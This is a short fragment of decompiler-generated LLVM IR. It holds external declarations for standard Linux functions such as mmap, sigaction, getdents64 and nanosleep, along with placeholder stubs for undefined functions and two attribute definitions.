declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
